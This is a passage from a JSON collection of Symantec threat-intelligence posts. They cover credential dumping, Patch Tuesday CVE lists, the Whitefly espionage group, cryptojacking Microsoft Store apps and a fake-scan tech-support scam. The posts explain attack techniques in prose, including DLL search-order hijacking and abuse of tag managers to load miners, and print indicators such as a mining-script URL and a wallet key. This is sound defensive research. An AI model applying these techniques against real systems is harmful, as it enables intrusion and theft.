analysts\". TAA correlates local events within an organization with information from Symantec’s massive global security telemetry data store to build out the full picture of attacker movement in the organization. Since its inception, TAA has detected security incidents at thousands of organizations, automating what would have taken many hours of analyst time. Examples of additional events that TAA can correlate to attempted credential dumping include: In addition to the detection provided by SEDR, Symantec Endpoint Protection (SEP) uses a variety of technologies to block credential-dumping techniques, including: Alerts from these technologies are displayed in SEP as: Symantec Endpoint Protection and Symantec Endpoint Detection and Response are just two offerings across Symantec's defense-in-depth portfolio that can help identify and block credential theft at various points in the attack chain. Our threat research teams continue to identify new credential dumping techniques being used in both targeted attacks as well ascyber crimeactivity. We look forward to sharing more both about the evolution of these attacks and about how Symantec's broad portfolio protects our customers against them. Trilling holds a B.S. in Computer Science and Mathematics from Yale University and an M.S. in Computer Science from the Massachusetts Institute of Technology.  His team delivers industry-leading protection technologies and advanced analytics re: attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/detecting-credential-dumping"
  },
  {
    "title": "microsoft patch tuesday march 2019",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the March 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0592)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0609)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0639)MS Rating: Critical Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2019-0666)MS Rating: Critical Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2019-0667)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0680)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2019-0763)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0769)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0770)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0771)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0773)MS Rating: Critical Microsoft Edge Privilege Escalation Vulnerability(CVE-2019-0678)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0746)MS Rating: Important Internet Explorer Security Bypass Vulnerability(CVE-2019-0768)MS Rating: Important Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2019-0772)MS Rating: Important Microsoft Edge Memory Corruption Vulnerability(CVE-2019-0779)MS Rating: Important Microsoft Browser Memory Corruption Vulnerability(CVE-2019-0780)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2019-0783)MS Rating: Important Microsoft Browsers Security Bypass Vulnerability(CVE-2019-0762)MS Rating: Important Microsoft Edge Security Bypass Vulnerability(CVE-2019-0612)MS Rating: Important Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2019-0665)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0611)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Office Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0748)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-0778)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Privilege Escalation Vulnerability(CVE-2019-0696)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0702)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0755)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0767)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0775)MS Rating: Important Win32k Information Disclosure Vulnerability(CVE-2019-0776)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0782)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-0797)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-0808)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows DHCP Client Remote Code Execution Vulnerability(CVE-2019-0697)MS Rating: Critical Windows DHCP Client Remote Code Execution Vulnerability(CVE-2019-0698)MS Rating: Critical Windows DHCP Client Remote Code Execution Vulnerability(CVE-2019-0726)MS Rating: Critical MS XML Remote Code Execution Vulnerability(CVE-2019-0756)MS Rating: Critical Windows ActiveX Remote Code Execution Vulnerability(CVE-2019-0784)MS Rating: Critical Windows Deployment Services TFTP Server Remote Code Execution Vulnerability(CVE-2019-0603)MS Rating: Critical Windows GDI Information Disclosure Vulnerability(CVE-2019-0614)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2019-0682)MS Rating: Important Active Directory Privilege Escalation Vulnerability(CVE-2019-0683)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2019-0689)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2019-0692)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2019-0693)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2019-0694)MS Rating: Important Windows SMB Information Disclosure Vulnerability(CVE-2019-0703)MS Rating: Important Windows SMB Information Disclosure Vulnerability(CVE-2019-0821)MS Rating: Important Windows SMB Information Disclosure Vulnerability(CVE-2019-0704)MS Rating: Important Windows Denial of Service Vulnerability(CVE-2019-0754)MS Rating: Important NuGet Package Manager Tampering Vulnerability(CVE-2019-0757)MS Rating: Important Windows Print Spooler Information Disclosure Vulnerability(CVE-2019-0759)MS Rating: Important Internet Explorer Security Bypass Vulnerability(CVE-2019-0761)MS Rating: Important Comctl32 Remote Code Execution Vulnerability(CVE-2019-0765)MS Rating: Important Microsoft Windows Privilege Escalation Vulnerability(CVE-2019-0766)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0774)MS Rating: Important Security Update for Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0617)MS Rating: Important Security Update for Microsoft Windows Hyper-V Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0690)MS Rating: Important Hyper-V Denial of Service Vulnerability(CVE-2019-0695)MS Rating: Important Hyper-V Denial of Service Vulnerability(CVE-2019-0701)MS Rating: Important Security Update for Visual Studio Visual Studio Remote Code Execution Vulnerability(CVE-2019-0809)MS Rating: Important Security Update for Team Foundation Server Team Foundation Server Cross-site Scripting Vulnerability(CVE-2019-0777)MS Rating: Low Security Update for Skype for Business and Lync Skype for Business and Lync Spoofing Vulnerability(CVE-2019-0798)MS Rating: Important Security Update for Azure Azure SSH Keypairs Security Bypass Vulnerability(CVE-2019-0816)MS Rating: Moderate More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-march-2019"
  },
  {
    "title": "whitefly espionage singapore",
    "content": "In July 2018, an attack on Singapore’s largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. Whitefly compromises its victims using custom malware alongside open-source hacking tools and living off the land tactics, such as malicious PowerShell scripts. From mid-2017 to mid-2018, Whitefly launched targeted attacks against multiple organizations. While most of these organizations were based in Singapore, some were multinational organizations with a presence in Singapore. To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors. Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image. These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim. Given the nature of disguise, it’s highly likely that they are sent to the victim using spear-phishing emails. If opened, the dropper runs a loader known asTrojan.Vcrodaton the computer. Whitefly has consistently used a technique known as search order hijacking to run Vcrodat. This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load. If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order. Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it. Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors. The group leverages search order hijacking to assure that its malicious DLLs will be executed. Targeting security applications could allow the attackers to gain higher privileges for the malware, since the vendor’s component may be run with elevated privileges. Once executed, Vcrodat loads an encrypted payload on to the victim’s computer. The payload contacts a command and control (C&C) domain. Whitefly configures multiple C&C domains for each target. The payload sends system information about the infected computer to the C&C server and downloads additional tools. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. Once the initial computer on the targeted organization’s network is infected with Vcrodat, Whitefly begins mapping the network and infecting further computers. In order to carry out this operation, it uses publicly available tools, including Mimikatz (Hacktool.Mimikatz) and an open-source tool (SHA2: 263dc5a8121d20403beeeea452b6f33d51d41c6842d9d19919def1f1cb13226c) that exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers. The attackers rely heavily on tools such as Mimikatz to obtain credentials. Using these credentials, the attackers are able to compromise more machines on the network and, from those machines, again obtain more credentials.  They perform this tactic repeatedly until they gain access to the desired data. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. It keeps the compromise alive by deploying a number of tools that facilitate communication between the attackers and infected computers. These tools include a simple remote shell tool that will call back to the C&C server and wait for commands, and an open-source hacking tool called Termite (Hacktool.Rootkit), which allows Whitefly to perform more complex actions such as controlling multiple compromised machines at a time. In some attacks, Whitefly has used a second piece of custom malware,Trojan.Nibatad. Like Vcrodat, Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer. And similar to Vcrodat, the Nibatad payload is designed to facilitate information theft from an infected computer. While Vcrodat is delivered via the malicious dropper, we have yet to discover how Nibatad is delivered to the infected computer. Why Whitefly uses these two different loaders in some of its attacks remains unknown. And while we have found both Vcrodat and Nibatad inside individual victim organizations, we have not found any evidence of them being used simultaneously on a single computer. Some of the tools that Whitefly has used in its attacks have also been deployed in other targeted attacks outside Singapore. Between May 2017 and December 2018, a multi-purpose command tool (SHA2: 7de8b8b314f2d2fb54f8f8ad4bba435e8fc58b894b1680e5028c90c0a524ccd9) that has been used by Whitefly was also used in attacks against defense, telecoms, and energy targets in Southeast Asia and Russia. The tool appears to be custom-built and, aside from its use by Whitefly, these were the only other attacks where Symantec has observed its use. In another case, Vcrodat was also used in an attack on a UK-based organization in the hospitality sector. It's possible Whitefly itself performed these attacks but it’s more likely that they were carried out by one or more other groups with access to the same tools. It now appears that the SingHealth breach was not a one-off attack and was instead part of a wider pattern of attacks against organizations in the region. Whitefly is a highly adept group with a large arsenal of tools at its disposal, capable of penetrating targeted organizations and maintaining a long-term presence on their networks. Links with attacks in other regions also present the possibility that it may be part of a broader intelligence gathering operation. Symantec has the following protection in place to protect customers against these attacks: File-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/whitefly-espionage-singapore"
  },
  {
    "title": "istr 24 cyber security threat landscape",
    "content": "Like flies to honey, miscreants are drawn to the latestcyber crimethat promises quick bucks with minimal effort. Ransomware and cryptojacking have had their day in the sun with the get-rich-quick criminals, and now it’s formjacking’s turn. In this year’sInternet Security Threat Report (ISTR) Volume 24, we share the latest insights into global threat activity, cyber criminal trends, and attacker motivations. This year's report notably reveals formjacking—where infected web servers skim off consumers' payment information—has emerged as the breakthrough threat of 2018. This threat showed explosive growth—and potentially big profits—at the end of the year, ensuring that it's likely to draw plenty of flies in 2019 and beyond. Often using third-party apps to infiltrate websites, formjacking also further illustrates the dangers of supply chain attacks, a growing weakness we first warned of in last year's report. Requiring only a few simple lines of code loaded onto a website, formjacking represents a significant threat to online retailers, or anyone who collects personally identifiable information from their customers via their website. This year's report notably reveals formjacking—where infected web servers skim off consumers’ payment information—has emerged as the breakthrough threat of 2018. While no longer easy money, ransomware and cryptojacking have not gone away. The ISTR shows that with the decline in the value of cryptocurrencies, getting rich quickly through cryptojacking isn't as easy as before, and some attackers have moved on to more lucrative activities. But attacks are easy to instigate and manage, meaning those criminals playing the long game can still make money. Overall, Symantec blocked four times as many cryptojacking attacks last year than in 2017, and it continues to persist as an active threat so far this year. Ransomware still offers the opportunity to make large sums of money. The SamSam gang is estimated to have made $6 million from their ransomware attacks. In fact, ransomware actors are increasingly narrowing in on enterprises, a high-value target. Ransomware infections grew in enterprise environments by 12 percent, while consumer infections declined. Consumers likely benefited due to their growing use of mobile devices, as criminals favor Office email attachments and PowerShell scripts—which don't work as well on mobile devices—to carry out ransomware attacks. Yet the threat landscape is not just about crime and the quest for cash. Nation-states quickly adopted the internet for espionage and have used it for destructive purposes. Late last year,Shamoon notably reemerged after a two-year absence, deploying wiping malware to delete files on computers of targeted organizations in the Middle East. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year. They also continue to refine their attack techniques, favoring spear phishing over zero days and using living off the land techniques to maintain a low profile and hide their attacks in a sea of legitimate IT processes. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year. In fact, Symantec'sTargeted Attack Analytics (TAA)technology discovered an attack group calledGallmakerin 2018 that needed no malware at all to infiltrate its targets. As attackers continue to use our own tools against us, detection must evolve from identifying malware to determining intent. Solutions based on machine learning and advanced artificial intelligence, like TAA, are increasingly critical for detecting attacks. It seems that no one would willingly carry on their person a device that would allow someone to spy on their every thought, conversation, and movement. But the headlines of today indicate that we do. That device is our smartphone, and it's not just spymasters seeking out information about us. Even legitimate applications are spying on us. To help understand the risks involved, Symantecanalyzed the top 100 Android and iOS applicationsin 2018 and found nearly half of Android apps and one-quarter of iOS apps requested location tracking. Apps asked for phone numbers, email addresses, access to cameras, microphones, photos, and any personal data stored on the device. That these applications want information about us—far beyond the needs of the application itself—is clear. What to do about it is not as clear, but it starts with understanding the extent of the problem. No blog can sufficiently cover the threat landscape, but the ISTR can. For much more on the threat landscape, to dive into the numbers behind the latest trends, or register for one of Symantec's ISTR webinars, visitgo.symantec.com/istr. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/istr-24-cyber-security-threat-landscape"
  },
  {
    "title": "cryptojacking apps microsoft store",
    "content": "On January 17, we discovered several potentially unwanted applications (PUAs) on the Microsoft Store that surreptitiously use the victim’s CPU power to mine cryptocurrency. We reported these apps to Microsoft and they subsequently removed them from their store. The apps—which included those for computer and battery optimization tutorial, internet search, web browsers, and video viewing and download—came from three developers: DigiDream, 1clean, and Findoo. In total, we discovered eight apps from these developers that shared the same risky behavior. After further investigation, we believe that all these apps were likely developed by the same person or group. Users may get introduced to these apps through the top free apps lists on the Microsoft Store or through keyword search. The samples we found run on Windows 10, including Windows 10 S Mode. As soon as the apps are downloaded and launched, they fetch a coin-mining JavaScript library by triggering Google Tag Manager (GTM) in their domain servers. The mining script then gets activated and begins using the majority of the computer’s CPU cycles to mine Monero for the operators. Although these apps appear to provide privacy policies, there is no mention of coin mining on their descriptions on the app store. The apps were published between April and December 2018, with most of them published toward the end of the year. Even though the apps were on the app store for a relatively short period of time, a significant number of users may have downloaded them. Although we can’t get exact download or installation counts, we can see that there were almost 1,900 ratings posted for these apps. However, app ratings can be fraudulently inflated, so it is difficult to know how many users really downloaded these apps. These apps’ domains are hardcoded in their app manifest file, as shown in Figure 2. When each app is launched, the domain is silently visited in the background and triggers GTM with the key GTM-PRFLJPX, which is shared across all eight applications. GTM is a legitimate tool that allows developers to inject JavaScript dynamically into their applications. However, GTM can be abused to conceal malicious or risky behaviors, since the link to the JavaScript stored in GTM ishttps://www.googletagmanager.com/gtm.js?id={GTM ID}which doesn’t indicate the function of the code invoked. By monitoring the network traffic from these apps, we found that they all connect to the following remote location, which is a coin-mining JavaScript library:http://statdynamic.com/lib/crypta.js The apps then access their own GTM and activate the mining script. Crypta.js is an encrypted JavaScript library, as shown in Figure 4. After we decoded it, we found that it was a version of the Coinhive library. Coinhive is a script that mines Monero. Since the Coinhive service was launched in September 2017, there have been many reports of it being used for cryptojacking without site visitors' knowledge. We also investigated the miner activation code on GTM, and the key source code is shown in Figure 5. We observed that the miner crawls with the keyda8c1ffb984d0c24acc5f8b966d6f218fc3ca6bda661, which serves as the wallet for Coinhive. These apps fall under the category of Progressive Web Applications, which are installed as a Windows 10 app running independently from the browser, in a standalone (WWAHost.exe process) window. From the apps’ network traffic, we found the hosting server for each app. Through a Whois query, we found that all of these servers actually have the same origin. Therefore, these apps were most likely published by the same developers using different names. We have informed Microsoft and Google about these apps’ behaviors. Microsoft has removed the apps from their store. The mining JavaScript has also been removed from Google Tag Manager. Stay protected from online threats and risks by taking these precautions: Symantec and Norton products detect the apps and the JavaScript cryptocurrency miner, respectively, as the following: Join us for a digital news event to hear how Symantec and our partners are working together to drive down the cost and complexity of cyber security, while protecting enterprises against sophisticated threats. Learn more about our Integrated Cyber Defense platform. Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. Tommy is a member of Symantec's Security Technology and Response team who are focused on researching and providing protection against current and future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/cryptojacking-apps-microsoft-store"
  },
  {
    "title": "microsoft patch tuesday february 2019",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the February 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Scripting Engine Memory Corruption Vulnerability(CVE-2019-0590)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0591)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0593)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0605)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2019-0606)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0607)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2019-0634)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0640)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0642)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2019-0644)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2019-0645)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0650)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0651)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0652)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0655)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0610)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0648)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0649)MS Rating: Important Microsoft Browser Spoofing Vulnerability(CVE-2019-0654)MS Rating: Important Scripting Engine Information Disclosure Vulnerability(CVE-2019-0658)MS Rating: Important Internet Explorer Information Disclosure Vulnerability(CVE-2019-0676)MS Rating: Important Microsoft Edge Security Bypass Vulnerability(CVE-2019-0641)MS Rating: Moderate Microsoft Edge Information Disclosure Vulnerability(CVE-2019-0643)MS Rating: Moderate Cumulative Security Update for Microsoft Office Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2019-0594)MS Rating: Critical Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2019-0604)MS Rating: Critical Microsoft Office Security Bypass Vulnerability(CVE-2019-0540)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2019-0668)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2019-0669)MS Rating: Important Microsoft SharePoint Spoofing Vulnerability(CVE-2019-0670)MS Rating: Moderate Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0671)MS Rating: Important Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0672)MS Rating: Important Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0673)MS Rating: Important Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0674)MS Rating: Important Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0675)MS Rating: Important Cumulative Security Update for Microsoft Exchange Microsoft Exchange Server Privilege Escalation Vulnerability(CVE-2019-0686)MS Rating: Important Microsoft Exchange Server Privilege Escalation Vulnerability(CVE-2019-0724)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Information Disclosure Vulnerability(CVE-2019-0621)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-0623)MS Rating: Important Win32k Information Disclosure Vulnerability(CVE-2019-0628)MS Rating: Important Windows Kernel Privilege Escalation Vulnerability(CVE-2019-0656)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-0661)MS Rating: Important Cumulative Security Update for Microsoft Windows GDI+ Remote Code Execution Vulnerability(CVE-2019-0618)MS Rating: Critical Windows DHCP Server Remote Code Execution Vulnerability(CVE-2019-0626)MS Rating: Critical GDI+ Remote Code Execution Vulnerability(CVE-2019-0662)MS Rating: Critical HID Information Disclosure Vulnerability(CVE-2019-0600)MS Rating: Important HID Information Disclosure Vulnerability(CVE-2019-0601)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0602)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0615)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0616)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0619)MS Rating: Important Windows Security Bypass Vulnerability(CVE-2019-0627)MS Rating: Important Windows SMB Remote Code Execution Vulnerability(CVE-2019-0630)MS Rating: Important Windows Security Bypass Vulnerability(CVE-2019-0631)MS Rating: Important Windows Security Bypass Vulnerability(CVE-2019-0632)MS Rating: Important Windows SMB Remote Code Execution Vulnerability(CVE-2019-0633)MS Rating: Important Windows Information Disclosure Vulnerability(CVE-2019-0636)MS Rating: Important Windows Defender Firewall Security Bypass Vulnerability(CVE-2019-0637)MS Rating: Important Windows Storage Service Privilege Escalation Vulnerability(CVE-2019-0659)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0660)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0664)MS Rating: Important Security Update for Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0595)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0596)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0597)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0598)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0599)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0625)MS Rating: Important Security Update for Microsoft .NET .NET Framework Remote Code Execution Vulnerability(CVE-2019-0613)MS Rating: Important .NET Spoofing Vulnerability(CVE-2019-0657)MS Rating: Important Security Update for Visual Studio Visual Studio Code Remote Code Execution Vulnerability(CVE-2019-0728)MS Rating: Important Security Update for Team Foundation Server Team Foundation Server Cross-site Scripting Vulnerability(CVE-2019-0742)MS Rating: Important Team Foundation Server Cross-site Scripting Vulnerability(CVE-2019-0743)MS Rating: Important Security Update for Microsoft Windows Hyper-V Windows Hyper-V Information Disclosure Vulnerability(CVE-2019-0635)MS Rating: Important Security Update for Azure IoT Java SDK Azure IoT Java SDK Privilege Escalation Vulnerability(CVE-2019-0729)MS Rating: Important Azure IoT Java SDK Information Disclosure Vulnerability(CVE-2019-0741)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-february-2019"
  },
  {
    "title": "tech support scams install puas",
    "content": "Tech support scams continue to prey on unwitting victims. We have seen in recent months how these scams are constantly evolving, from the use ofcall optimizationto the use ofAdvanced Encryption Standard(AES) and amulti-level obfuscation scheme. Tech support scammers' modus operandi is to get the victim to believe that their computer has been infected with malware, and that their only recourse is to call a technical support number for assistance on cleaning the system. Once on the call, a purported support executive would ask the victim for remote access to their computer and then charge a fee for the supposed cleaning they did. While scammers' playbooks remain more or less the same, we have recently seen how scammers are now tricking victims into installing a potentially unwanted application (PUA), rather than urging them to call a support helpline. Toward the end of 2018, we observed a tech support scam campaign that displays a fake Windows alert, warning the victim that their computer might be infected. The scam prompts the victim to approve a supposedly quick 10-second scan of their computer. Once the user clicks OK, the scammers pull off a highly convincing but fake system scan that is almost identical to Norton Security's. We will provide details on how exactly the scammers pull this off later in this blog. At the end of the fake scan, the victim is informed that their PC is indeed infected and then asked to download and install an update to their antivirus software. Upon clicking Proceed, a potentially unwanted application (PUA) is downloaded and installed onto the victim's computer. Just like most tech support scams, this one typically begins after the user visits a malicious website, or is redirected to one through malvertising or a compromised website. We went through the scam's source code to see how this fake scan trickery was achieved. The code contains HTML div elements with the display property set to \"none\", as shown in Figure 3. This setting of display property ensures that the div element is not visible to the victim as soon as the page loads. Moving forward, we see JavaScript code, as shown in Figure 4. The setTimeout() method calls a function or evaluates an expression after a specified number of milliseconds. When the script shown in Figure 4 starts executing, it will first change the display style of the div to \"block\" after two seconds, thereby making the div visible to the victim. The scammer progressively increases the time period for the subsequent calls to the setTimeout() function. This makes the \"windows\" appear on top of each other, one after the other, on the front end. Thus, the victim first sees the start of the scan process, followed by the intermediate in-progress scan graphics, and finally the graphic box, which displays that the system is infected. In Figure 4, we can see some values being assigned to different HTML elements via JavaScript. For example, the element \"cnt1\" is being assigned a value of 218, \"path1\" is assigned a value of \"C:\\Windows\\System32\\sihost.exe\", and so on. These are the values for the number of files scanned and the current file being scanned as it appears on the front end. The scammer cleverly makes use of the setTimeout() function to change these values over a period of time, giving the victim the illusion that an actual scan is in progress and that their files are being scanned. The scammer cleverly makes use of the setTimeout() function to change values over a period of time, giving the victim the illusion that an actual scan is in progress and that their files are being scanned. In this scam, the scammer does not force the victim to call a support helpline, but rather tricks the victim into downloading a PUA. Typically, a PUA comes bundled with other intended software and gets installed along with the intended software. PUAs have been known to perform the following actions on the computer: In a typical tech support scam revenue-generation model, the scammer is dependent on the victim calling the support helpline to earn revenue. However, in this case, we have observed that the malicious code keeps track of the number of victims who are tricked into installing the PUA. In this scenario, the scammer earns revenue by maximizing the number of PUA installs. Digging into our telemetry, we located an unsecured attacker dashboard, which shows the revenue distribution for this model. In Figure 6, we can clearly see the number of clicks generated by each traffic source and the corresponding returns on investment (ROI) from these sources. This model is similar to that used in the exploit kit (EK) space, where malware authors use EKs as a mechanism to deliver their malware to more and more victims and thereby maximize their profit. In the past few weeks, we have also seen similar tech support scams that follow the PUA revenue-generation model. One such scam tricks the victim into believing that their Windows drivers are not updated and asks them to download and install the \"latest drivers\", which are actually PUAs. If this new model proves more profitable than the helpline route down the road, we are likely to see its adoption increase among scammers. Know what's real from fake. Even though the \"Norton\" scan looks almost indistinguishable from the real one, there are many attributes that easily indicate it is fake: Symantec proactively protects customers against tech support scams. Our intrusion prevention system (IPS) technology protects customers by blocking malicious network activity associated with such scams using a wide variety of detections. In the last quarter of 2018, Symantec's IPS blocked more than 89 million tech support scams. Norton Security,Symantec Endpoint Protection, and many otherSymantec security productshave comprehensive network-based protection features such as firewall and IPS built in. To protect yourself from these types of scams, ensure that these features are enabled. Also, make sure to visit only legitimate websites when you need support for any product. Last but not least, make sure your security product is updated regularly. More information on tech support scams can be foundhere. Siddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He analyzes and creates IPS protection for various network-based threats such as exploit kits and tech support scams. Pankaj works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He analyzes and creates IPS protection for various network-based threats such as malscripts, formjacking, EKs, and tech support scams. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/tech-support-scams-install-puas"
  },
  {
    "title": "african financial attacks",
    "content": "Banks and other financial institutions in a number of West African countries have been targeted bycyber criminalsemploying a range of commodity malware and living off the land tools. The attacks have been underway since at least mid-2017. To date, organizations in Cameroon, Congo (DR), Ghana, Equatorial Guinea, and Ivory Coast have been affected. Who is behind these attacks remains unknown. They could be the work of a single group or, more likely, several different groups employing similar tactics. Symantec has observed four distinct attack campaigns directed against financial targets in Africa. The first has been underway since at least mid-2017 and has targeted organizations in Ivory Coast and Equatorial Guinea. The attackers infected victims with commodity malware known as NanoCore (Trojan.Nancrat) and were also observed using PsExec, a Microsoft Sysinternals tool used for executing processes on other systems, on infected computers. Lure documents used by the attackers referred to a West African bank which has operations in several countries in the region. Some tools used in these attacks are similar to tools mentioned in a 2017 SWIFT alert, indicating the attackers may have been attempting to perform financial fraud. The second type of attack began in late 2017 and targeted organizations in Ivory Coast, Ghana, Congo (DR), and Cameroon. The attackers used malicious PowerShell scripts to infect their targets and also used the credential-stealing tool Mimikatz (Hacktool.Mimikatz). They also made use of UltraVNC, an open-source remote administration tool for Microsoft Windows. The attackers then infected computers with the commodity malware 